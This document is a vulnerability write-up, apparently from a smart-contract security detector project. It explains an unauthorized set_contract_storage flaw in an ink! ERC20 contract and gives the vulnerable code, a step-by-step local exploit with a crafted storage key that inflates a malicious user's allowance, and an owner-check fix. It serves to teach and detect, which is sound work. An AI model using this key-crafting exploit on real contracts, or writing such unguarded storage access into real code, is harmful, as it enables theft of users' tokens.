# Set contract storage

## Description
- Vulnerability Category: `Authorization`
- Severity: `Critical`
- Detectors: [`set-contract-storage`](https://github.com/CoinFabrik/scout/tree/main/detectors/set-contract-storage)
- Test Cases: [`set-contract-storage-1`](https://github.com/CoinFabrik/scout/tree/main/test-cases/set-contract-storage/set-contract-storage-1)

Smart contract can store important information in memory which changes 
through the contract's lifecycle. Changes happen via user interaction with 
the smart contract. An _unauthorized set contract storage_ vulnerability 
happens when a smart contract call allows a user to set or modify contract 
memory when he was not supposed to be authorized.

In this example, we see how this vulnerability can be exploited to change a 
user's allowance in an [ERC20](https://ethereum.org/en/developers/docs/standards/tokens/erc-20/)
contract.

## Exploit Scenario
In this example we see that any user may access the 
`set_contract_storage()` function, and therefore modify the value for any key
arbitrarily.

```rust
#[ink::trait_definition]
pub trait MisusedSetContractStorage {
    #[ink(message)]
    fn misused_set_contract_storage(&mut self, user_input_key: [u8; 68], user_input_data: u128) -> Result<()>;
}


impl MisusedSetContractStorage for Erc20 {
    #[ink(message)]
    fn misused_set_contract_storage(&mut self, user_input_key: [u8; 68], user_input_data: u128) -> Result<()> {
        env::set_contract_storage(&user_input_key, &user_input_data);
        Ok(())
    }
}
```

The vulnerable code example can be found [here](https://github.com/CoinFabrik/scout/blob/main/test-cases/set-contract-storage/set-contract-storage-1/vulnerable-example/lib.rs).

### Deployment
To compile this example, `cargo-contract` v2.0.1 (or above) is required.

In order to run this exploit, [download](https://github.com/paritytech/substrate-contracts-node/releases), unzip and run a substrate node with `./substrate-contract-node`. Download the contents of the `example` folder associated to this detector and compile the contract running `cargo contract build` and build the binary.

Afterwards, upload the the binary into the running network with the account `Alice` using `cargo contract upload --suri //Alice ./target/ink/my_contract.contract`.


```bash
$ cargo contract upload --suri //Alice ./target/ink/my_contract.contract

      Events
       Event Balances ➜ Withdraw
         who: 5GrwvaEF5zXb26Fz9rcQpDWS57CtERHpNehXCPcNoHGKutQY
         amount: 3.366751549mUNIT
       Event Balances ➜ Reserved
         who: 5GrwvaEF5zXb26Fz9rcQpDWS57CtERHpNehXCPcNoHGKutQY
         amount: 587.83mUNIT
       Event Contracts ➜ CodeStored
         code_hash: 0xacb7ab745fa131cf8a8eb0f5bb2d98f88ea186da39dee2e80b1289bcfd9d7f25
       Event TransactionPayment ➜ TransactionFeePaid
         who: 5GrwvaEF5zXb26Fz9rcQpDWS57CtERHpNehXCPcNoHGKutQY
         actual_fee: 3.366751549mUNIT
         tip: 0UNIT
       Event System ➜ ExtrinsicSuccess
         dispatch_info: DispatchInfo { weight: Weight { ref_time: 3366724431, proof_size: 0 }, class: Normal, pays_fee: Yes }

   Code hash "0xacb7ab745fa131cf8a8eb0f5bb2d98f88ea186da39dee2e80b1289bcfd9d7f25"
```

Instantiate the uploaded smart contract with 100000 tokens from `Alice` running
`cargo contract instantiate --args 100000 --suri //Alice`, press `y` and 
`[Enter]`.

```bash
$ cargo contract instantiate --args 100000 --suri //Alice

 Dry-running new (skip with --skip-dry-run)
    Success! Gas required estimated at Weight(ref_time: 1173504383, proof_size: 0)
Confirm transaction details: (skip with --skip-confirm)
 Constructor new
        Args 100000
   Gas limit Weight(ref_time: 1173504383, proof_size: 0)
Submit? (Y/n): y
      Events
       Event Balances ➜ Withdraw
         who: 5GrwvaEF5zXb26Fz9rcQpDWS57CtERHpNehXCPcNoHGKutQY
         amount: 99.001146μUNIT
       Event System ➜ NewAccount
         account: 5Gj5Z1Nf8NPkaP2iuBQhkJQRt1f7Nt7H2umwbrRRnonnKEQf
       Event Balances ➜ Endowed
         account: 5Gj5Z1Nf8NPkaP2iuBQhkJQRt1f7Nt7H2umwbrRRnonnKEQf
         free_balance: 100.605mUNIT
       Event Balances ➜ Transfer
         from: 5GrwvaEF5zXb26Fz9rcQpDWS57CtERHpNehXCPcNoHGKutQY
         to: 5Gj5Z1Nf8NPkaP2iuBQhkJQRt1f7Nt7H2umwbrRRnonnKEQf
         amount: 100.605mUNIT
       Event Balances ➜ Reserved
         who: 5Gj5Z1Nf8NPkaP2iuBQhkJQRt1f7Nt7H2umwbrRRnonnKEQf
         amount: 100.605mUNIT
       Event Contracts ➜ ContractEmitted
         contract: 5Gj5Z1Nf8NPkaP2iuBQhkJQRt1f7Nt7H2umwbrRRnonnKEQf
         data: Transfer { from: None, to: Some(5GrwvaEF5zXb26Fz9rcQpDWS57CtERHpNehXCPcNoHGKutQY), value: 100000 }
       Event Contracts ➜ Instantiated
         deployer: 5GrwvaEF5zXb26Fz9rcQpDWS57CtERHpNehXCPcNoHGKutQY
         contract: 5Gj5Z1Nf8NPkaP2iuBQhkJQRt1f7Nt7H2umwbrRRnonnKEQf
       Event Balances ➜ Transfer
         from: 5GrwvaEF5zXb26Fz9rcQpDWS57CtERHpNehXCPcNoHGKutQY
         to: 5Gj5Z1Nf8NPkaP2iuBQhkJQRt1f7Nt7H2umwbrRRnonnKEQf
         amount: 200.16mUNIT
       Event Balances ➜ Reserved
         who: 5Gj5Z1Nf8NPkaP2iuBQhkJQRt1f7Nt7H2umwbrRRnonnKEQf
         amount: 200.16mUNIT
       Event TransactionPayment ➜ TransactionFeePaid
         who: 5GrwvaEF5zXb26Fz9rcQpDWS57CtERHpNehXCPcNoHGKutQY
         actual_fee: 99.001146μUNIT
         tip: 0UNIT
       Event System ➜ ExtrinsicSuccess
         dispatch_info: DispatchInfo { weight: Weight { ref_time: 5236087078, proof_size: 0 }, class: Normal, pays_fee: Yes }

    Contract 5Gj5Z1Nf8NPkaP2iuBQhkJQRt1f7Nt7H2umwbrRRnonnKEQf

```

Notice that, in this case, the contract address is 
`5Gj5Z1Nf8NPkaP2iuBQhkJQRt1f7Nt7H2umwbrRRnonnKEQf`. 
For Alice, her address is by default 
`5GrwvaEF5zXb26Fz9rcQpDWS57CtERHpNehXCPcNoHGKutQY` and Bob's address is 
`5FHneW46xGXgs5mUiveU4sbTyGBzmstUspZC92UhjJM694ty`.

You can get Alice's allowance for Bob with the following command 
`cargo contract call --contract 5Gj5Z1Nf8NPkaP2iuBQhkJQRt1f7Nt7H2umwbrRRnonnKEQf --message BaseErc20::allowance --args 5GrwvaEF5zXb26Fz9rcQpDWS57CtERHpNehXCPcNoHGKutQY 5FHneW46xGXgs5mUiveU4sbTyGBzmstUspZC92UhjJM694ty --suri //Alice --dry-run`. 
Make sure to replace the contract address with the one you obtained. In this 
case, you will see that the allowance is set to zero.

```bash
$ cargo contract call --contract 5Gj5Z1Nf8NPkaP2iuBQhkJQRt1f7Nt7H2umwbrRRnonnKEQf --message BaseErc20::allowance --args 5GrwvaEF5zXb26Fz9rcQpDWS57CtERHpNehXCPcNoHGKutQY 5FHneW46xGXgs5mUiveU4sbTyGBzmstUspZC92UhjJM694ty --suri //Alice --dry-run

      Result Success!
    Reverted false
        Data Ok(0)

```

Alice can approve a higher allowance for Bob using the `approve()` function
with the command 
`cargo contract call --contract 5Gj5Z1Nf8NPkaP2iuBQhkJQRt1f7Nt7H2umwbrRRnonnKEQf --message BaseErc20::approve --args 5FHneW46xGXgs5mUiveU4sbTyGBzmstUspZC92UhjJM694ty 10 --suri //Alice`.

```bash
$ cargo contract call --contract 5Gj5Z1Nf8NPkaP2iuBQhkJQRt1f7Nt7H2umwbrRRnonnKEQf --message BaseErc20::approve --args 5FHneW46xGXgs5mUiveU4sbTyGBzmstUspZC92UhjJM694ty 10 --suri //Alice

 Dry-running BaseErc20::approve (skip with --skip-dry-run)
    Success! Gas required estimated at Weight(ref_time: 7983333376, proof_size: 262144)
Confirm transaction details: (skip with --skip-confirm)
     Message BaseErc20::approve
        Args 5FHneW46xGXgs5mUiveU4sbTyGBzmstUspZC92UhjJM694ty 10
   Gas limit Weight(ref_time: 7983333376, proof_size: 262144)
Submit? (Y/n): y
      Events
       Event Balances ➜ Withdraw
         who: 5GrwvaEF5zXb26Fz9rcQpDWS57CtERHpNehXCPcNoHGKutQY
         amount: 98.974204μUNIT
       Event Contracts ➜ ContractEmitted
         contract: 5Gj5Z1Nf8NPkaP2iuBQhkJQRt1f7Nt7H2umwbrRRnonnKEQf
         data: Approval { owner: 5GrwvaEF5zXb26Fz9rcQpDWS57CtERHpNehXCPcNoHGKutQY, spender: 5FHneW46xGXgs5mUiveU4sbTyGBzmstUspZC92UhjJM694ty, value: 10 }
       Event Contracts ➜ Called
         caller: 5GrwvaEF5zXb26Fz9rcQpDWS57CtERHpNehXCPcNoHGKutQY
         contract: 5Gj5Z1Nf8NPkaP2iuBQhkJQRt1f7Nt7H2umwbrRRnonnKEQf
       Event Balances ➜ Transfer
         from: 5GrwvaEF5zXb26Fz9rcQpDWS57CtERHpNehXCPcNoHGKutQY
         to: 5Gj5Z1Nf8NPkaP2iuBQhkJQRt1f7Nt7H2umwbrRRnonnKEQf
         amount: 100.08mUNIT
       Event Balances ➜ Reserved
         who: 5Gj5Z1Nf8NPkaP2iuBQhkJQRt1f7Nt7H2umwbrRRnonnKEQf
         amount: 100.08mUNIT
       Event TransactionPayment ➜ TransactionFeePaid
         who: 5GrwvaEF5zXb26Fz9rcQpDWS57CtERHpNehXCPcNoHGKutQY
         actual_fee: 98.974204μUNIT
         tip: 0UNIT
       Event System ➜ ExtrinsicSuccess
         dispatch_info: DispatchInfo { weight: Weight { ref_time: 3485758564, proof_size: 30498 }, class: Normal, pays_fee: Yes }
```

Let us assume Bob is a malicious user and he wants to set a higher allowance
for himself without Alice's approval. Taking a look at the smart contract, 
he notices that the function `misused_set_contract_storage()` has no access 
control validation and uses the `set_contract_storage()` function. Working on 
the input of this function, he could change the contract's storage and his 
allowance.

In order to do this, he runs the following command `cargo contract call --contract 5Gj5Z1Nf8NPkaP2iuBQhkJQRt1f7Nt7H2umwbrRRnonnKEQf --message MisusedSetContractStorage::misused_set_contract_storage --args [255,0,0,0,212,53,147,199,21,253,211,28,97,20,26,189,4,169,159,214,130,44,133,88,133,76,205,227,154,86,132,231,165,109,162,125,142,175,4,21,22,135,115,99,38,201,254,161,126,37,252,82,135,97,54,147,201,18,144,156,178,38,170,71,148,242,106,72] 1000000 --suri //Bob`.

```bash
$ cargo contract call --contract 5Gj5Z1Nf8NPkaP2iuBQhkJQRt1f7Nt7H2umwbrRRnonnKEQf --message MisusedSetContractStorage::misused_set_contract_storage --args [255,0,0,0,212,53,147,199,21,253,211,28,97,20,26,189,4,169,159,214,130,44,133,88,133,76,205,227,154,86,132,231,165,109,162,125,142,175,4,21,22,135,115,99,38,201,254,161,126,37,252,82,135,97,54,147,201,18,144,156,178,38,170,71,148,242,106,72] 1000000 --suri //Bob

 Dry-running MisusedSetContractStorage::misused_set_contract_storage (skip with --skip-dry-run)
    Success! Gas required estimated at Weight(ref_time: 7983333376, proof_size: 262144)
Confirm transaction details: (skip with --skip-confirm)
     Message MisusedSetContractStorage::misused_set_contract_storage
        Args [255,0,0,0,212,53,147,199,21,253,211,28,97,20,26,189,4,169,159,214,130,44,133,88,133,76,205,227,154,86,132,231,165,109,162,125,142,175,4,21,22,135,115,99,38,201,254,161,126,37,252,82,135,97,54,147,201,18,144,156,178,38,170,71,148,242,106,72] 1000000
   Gas limit Weight(ref_time: 7983333376, proof_size: 262144)
Submit? (Y/n): y
      Events
       Event Balances ➜ Withdraw
         who: 5FHneW46xGXgs5mUiveU4sbTyGBzmstUspZC92UhjJM694ty
         amount: 98.974241μUNIT
       Event Contracts ➜ Called
         caller: 5FHneW46xGXgs5mUiveU4sbTyGBzmstUspZC92UhjJM694ty
         contract: 5Gj5Z1Nf8NPkaP2iuBQhkJQRt1f7Nt7H2umwbrRRnonnKEQf
       Event TransactionPayment ➜ TransactionFeePaid
         who: 5FHneW46xGXgs5mUiveU4sbTyGBzmstUspZC92UhjJM694ty
         actual_fee: 98.974241μUNIT
         tip: 0UNIT
       Event System ➜ ExtrinsicSuccess
         dispatch_info: DispatchInfo { weight: Weight { ref_time: 2142080861, proof_size: 30498 }, class: Normal, pays_fee: Yes }
```

If we check now Bob's allowance, we see that he has access to 1000000 tokens!

```bash
$ cargo contract call --contract 5Gj5Z1Nf8NPkaP2iuBQhkJQRt1f7Nt7H2umwbrRRnonnKEQf --message BaseErc20::allowance --args 5GrwvaEF5zXb26Fz9rcQpDWS57CtERHpNehXCPcNoHGKutQY 5FHneW46xGXgs5mUiveU4sbTyGBzmstUspZC92UhjJM694ty --suri //Alice --dry-run

      Result Success!
    Reverted false
        Data Ok(1000000)
```

Breaking down the used key `[255,0,0,0,212,53,147,199,21,253,211,28,97,20,26,189,4,169,159,214,130,44,133,88,133,76,205,227,154,86,132,231,165,109,162,125,142,175,4,21,22,135,115,99,38,201,254,161,126,37,252,82,135,97,54,147,201,18,144,156,178,38,170,71,148,242,106,72]`, 
we note that:
- `[255,0,0,0]` stands for allowances mapping.
- `[212,53,147,199,21,253,211,28,97,20,26,189,4,169,159,214,130,44,133,88,133,76,205,227,154,86,132,231,165,109,162,125]` corresponds, byte by byte, to Alice's address `5GrwvaEF5zXb26Fz9rcQpDWS57CtERHpNehXCPcNoHGKutQY`.
- `[142,175,4,21,22,135,115,99,38,201,254,161,126,37,252,82,135,97,54,147,201,18,144,156,178,38,170,71,148,242,106,72]` corresponds, byte by byte, to Bob's address `5FHneW46xGXgs5mUiveU4sbTyGBzmstUspZC92UhjJM694ty`.

## Remediation
Arbitrary users should not have control over keys because it implies writing 
any value of a mapping, lazy variable, or the main struct of the contract 
located in position 0 of the storage. 
To prevent this issue, set access control and proper authorization validation 
for the `set_contract_storage()` function. 

Arbitrary users should not have control over keys because it implies writing
any value of a mapping, lazy variable, or the main struct of the contract 
located in position 0 of the storage.
Set access control and proper authorization validation for the 
`set_contract_storage()` function.

For example, the code below, ensures only the owner can call 
`misused_set_contract_storage()`.

```rust
#[ink(message)]
fn misused_set_contract_storage(&mut self, user_input_key: [u8; 68], user_input_data: u128) -> Result<()> {
    if self.env().caller() == self.owner {
        env::set_contract_storage(&user_input_key, &user_input_data);
        Ok(())
    } else {
        Err(Error::UserNotOwner)
    }
}
```

The remediated code example can be found [here](https://github.com/CoinFabrik/scout/blob/main/test-cases/set-contract-storage/set-contract-storage-1/remediated-example/lib.rs).

## References
* https://use.ink/datastructures/storage-layout
